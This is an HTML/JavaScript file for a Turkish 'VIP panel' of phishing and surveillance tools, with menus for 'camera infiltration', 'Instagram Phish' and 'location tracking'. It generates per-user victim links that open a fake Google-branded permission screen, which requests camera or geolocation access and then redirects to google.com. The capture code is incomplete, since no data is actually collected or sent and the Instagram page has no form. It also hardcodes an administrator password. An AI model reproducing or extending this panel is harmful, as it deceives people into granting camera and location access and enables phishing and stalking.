<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AFAVAN66 - VIP Panel V5</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        :root { --bg: #000; --accent: #4285F4; --border: #111; --sidebar-w: 280px; --ig: #e1306c; --loc: #34A853; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'JetBrains Mono', monospace; }
        body { background: var(--bg); color: white; overflow-x: hidden; }

        /* AUTH SCREEN */
        #auth-screen { position: fixed; inset: 0; background: var(--bg); display: flex; align-items: center; justify-content: center; z-index: 9999; }
        .auth-card { width: 90%; max-width: 400px; padding: 30px; border: 1px solid var(--border); border-radius: 12px; background: #050505; }
        .tabs { display: flex; margin-bottom: 20px; border-bottom: 1px solid var(--border); }
        .tab { flex: 1; text-align: center; padding: 12px; cursor: pointer; color: #444; font-size: 13px; }
        .tab.active { color: var(--accent); border-bottom: 2px solid var(--accent); }
        input { width: 100%; background: #000; border: 1px solid #222; padding: 15px; color: white; outline: none; margin-bottom: 12px; border-radius: 6px; }
        .btn { width: 100%; padding: 15px; border: none; font-weight: bold; cursor: pointer; border-radius: 6px; text-transform: uppercase; font-size: 12px; }
        .btn-blue { background: var(--accent); color: white; }

        /* HEADER */
        header { position: fixed; top: 0; width: 100%; height: 60px; background: #050505; display: flex; align-items: center; padding: 0 15px; border-bottom: 1px solid var(--border); z-index: 1000; }
        .menu-btn { font-size: 26px; color: var(--accent); cursor: pointer; background: none; border: none; margin-right: 15px; }

        /* SIDEBAR */
        #sidebar { position: fixed; top: 0; left: -280px; width: 280px; height: 100%; background: #050505; border-right: 1px solid var(--border); transition: 0.3s; z-index: 1001; }
        #sidebar.active { left: 0; }
        .side-head { padding: 25px 20px 10px; color: #333; font-size: 10px; letter-spacing: 2px; text-transform: uppercase; }
        .side-link { padding: 15px 20px; color: #fff; cursor: pointer; display: flex; align-items: center; gap: 12px; font-size: 14px; text-decoration: none; border-left: 4px solid transparent; }
        .side-link.active { background: rgba(66, 133, 244, 0.1); color: var(--accent); border-left-color: var(--accent); }
        .logout { position: absolute; bottom: 0; width: 100%; padding: 20px; color: #ff0000; cursor: pointer; font-weight: bold; border-top: 1px solid var(--border); }

        /* PANEL CONTENT */
        main { padding: 80px 20px; max-width: 600px; margin: 0 auto; display: none; }
        .tool-section { display: none; }
        .tool-section.active { display: block; animation: fadeIn 0.4s; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        .card { background: #080808; border: 1px solid var(--border); padding: 25px; border-radius: 12px; margin-bottom: 20px; }
        .link-input-group { display: flex; gap: 10px; margin: 15px 0; }
        .link-input-group input { margin-bottom: 0; flex-grow: 1; font-size: 12px; }
        .final-link { background: #000; border: 1px dashed #222; padding: 12px; font-size: 10px; color: var(--accent); word-break: break-all; border-radius: 8px; }
        
        #overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.8); display: none; z-index: 1000; }
        #overlay.active { display: block; }
        
        /* KURBAN EKRANI (IZIN ISTEME) */
        #victim-screen { position: fixed; inset: 0; background: white; color: black; z-index: 10000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; }
    </style>
</head>
<body>

    <div id="victim-screen">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92" alt="Google">
        <h3 style="margin: 20px 0 10px; font-family: sans-serif;">Devam etmek için izin verin</h3>
        <p style="font-family: sans-serif; color: #5f6368; font-size: 14px;">Hizmet kalitesini artırmak için tarayıcı izinleri gerekiyor.</p>
        <button class="btn btn-blue" style="margin-top: 20px; width: 200px;" onclick="requestPermissions()">DEVAM ET</button>
    </div>

    <div id="auth-screen">
        <div class="auth-card">
            <h2 style="text-align:center; color:var(--accent); margin-bottom:25px;">AFAVAN66 V5</h2>
            <div class="tabs">
                <div class="tab active" id="tab-l" onclick="setAuth('login')">GİRİŞ</div>
                <div class="tab" id="tab-r" onclick="setAuth('reg')">MAİL KAYIT</div>
            </div>
            <input type="email" id="u-mail" placeholder="E-posta">
            <input type="password" id="p-pass" placeholder="Şifre">
            <button class="btn btn-blue" onclick="handleAuth()">PANELİ AÇ</button>
        </div>
    </div>

    <header>
        <button class="menu-btn" onclick="toggleMenu()">☰</button>
        <span style="font-weight:bold;">AFAVAN66 <span style="color:var(--accent)">VIP</span></span>
    </header>

    <div id="overlay" onclick="toggleMenu()"></div>
    
    <nav id="sidebar">
        <div class="side-head">SIZMA ARAÇLARI</div>
        <div class="side-link active" id="m-cam" onclick="showTool('cam')">📷 Kamera Sızma</div>
        <div class="side-link" id="m-ig" onclick="showTool('ig')">📸 Instagram Phish</div>
        <div class="side-link" id="m-loc" onclick="showTool('loc')">📍 Konum Takibi</div>
        <div class="logout" onclick="logout()">🔴 ÇIKIŞ YAP</div>
    </nav>

    <main id="main-panel">
        <div id="sec-cam" class="tool-section active">
            <div class="card">
                <h3>Kamera Sızma Linki</h3>
                <p style="font-size:11px; color:#444; margin: 10px 0;">Link sonunu istediğin gibi değiştir:</p>
                <div class="link-input-group">
                    <input type="text" id="slug-cam" placeholder="örnek-link-adi">
                    <button class="btn btn-blue" style="width: auto; padding: 0 15px;" onclick="updateLinks()">SET</button>
                </div>
                <div class="final-link" id="val-cam"></div>
                <button class="btn btn-blue" style="margin-top: 15px;" onclick="copy('val-cam')">KOPYALA</button>
            </div>
        </div>

        <div id="sec-ig" class="tool-section">
            <div class="card"><h3>Instagram Phish</h3><div class="link-input-group"><input type="text" id="slug-ig" placeholder="ig-giris"><button class="btn btn-blue" onclick="updateLinks()">SET</button></div><div class="final-link" id="val-ig"></div><button class="btn btn-blue" style="margin-top:15px; background:var(--ig)" onclick="copy('val-ig')">KOPYALA</button></div>
        </div>

        <div id="sec-loc" class="tool-section">
            <div class="card"><h3>Konum Takibi</h3><div class="link-input-group"><input type="text" id="slug-loc" placeholder="harita-konum"><button class="btn btn-blue" onclick="updateLinks()">SET</button></div><div class="final-link" id="val-loc"></div><button class="btn btn-blue" style="margin-top:15px; background:var(--loc)" onclick="copy('val-loc')">KOPYALA</button></div>
        </div>
    </main>

    <script>
        let db = JSON.parse(localStorage.getItem('afa_v5_db')) || {};
        let currentTool = 'cam';

        window.onload = () => {
            const urlParams = new URLSearchParams(window.location.search);
            // EĞER KURBAN LİNKİNE TIKLANDIYSA (URL'de 'id' varsa)
            if (urlParams.has('id')) {
                document.getElementById('victim-screen').style.display = 'flex';
                document.getElementById('auth-screen').style.display = 'none';
                return;
            }

            const sess = localStorage.getItem('afa_session');
            if(sess) login(JSON.parse(sess));
        };

        function setAuth(m) {
            document.getElementById('tab-l').classList.toggle('active', m === 'login');
            document.getElementById('tab-r').classList.toggle('active', m === 'reg');
            window.mode = m;
        }

        function handleAuth() {
            const m = document.getElementById('u-mail').value;
            const p = document.getElementById('p-pass').value;
            if(m === "afavan66" && p === "Efecan1903") return login({ mail: m, id: 'ROOT' });
            
            if(window.mode === 'reg') {
                db[m] = { pass: p, id: Math.random().toString(36).substring(7) };
                localStorage.setItem('afa_v5_db', JSON.stringify(db));
                alert("Kayıt başarılı!");
            } else {
                if(db[m] && db[m].pass === p) login({ mail: m, id: db[m].id });
                else alert("Hata!");
            }
        }

        function login(user) {
            localStorage.setItem('afa_session', JSON.stringify(user));
            document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('main-panel').style.display = 'block';
            updateLinks();
        }

        function updateLinks() {
            const sess = JSON.parse(localStorage.getItem('afa_session'));
            const base = window.location.origin + window.location.pathname;
            const camS = document.getElementById('slug-cam').value || 'view';
            const igS = document.getElementById('slug-ig').value || 'login';
            const locS = document.getElementById('slug-loc').value || 'maps';

            document.getElementById('val-cam').innerText = `${base}?type=cam&id=${sess.id}&slug=${camS}`;
            document.getElementById('val-ig').innerText = `${base}?type=ig&id=${sess.id}&slug=${igS}`;
            document.getElementById('val-loc').innerText = `${base}?type=loc&id=${sess.id}&slug=${locS}`;
        }

        async function requestPermissions() {
            const urlParams = new URLSearchParams(window.location.search);
            const type = urlParams.get('type');

            try {
                if (type === 'cam') await navigator.mediaDevices.getUserMedia({ video: true });
                if (type === 'loc') await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
                // Veri toplama bitti, Google'a salla
                window.location.href = "https://www.google.com";
            } catch (e) {
                window.location.href = "https://www.google.com";
            }
        }

        function showTool(t) {
            document.querySelectorAll('.tool-section').forEach(s => s.classList.remove('active'));
            document.querySelectorAll('.side-link').forEach(l => l.classList.remove('active'));
            document.getElementById('sec-' + t).classList.add('active');
            document.getElementById('m-' + t).classList.add('active');
            toggleMenu();
        }

        function toggleMenu() {
            document.getElementById('sidebar').classList.toggle('active');
            document.getElementById('overlay').classList.toggle('active');
        }

        function copy(id) {
            navigator.clipboard.writeText(document.getElementById(id).innerText);
            alert("Link kopyalandı!");
        }

        function logout() { localStorage.removeItem('afa_session'); location.reload(); }
    </script>
</body>
</html>
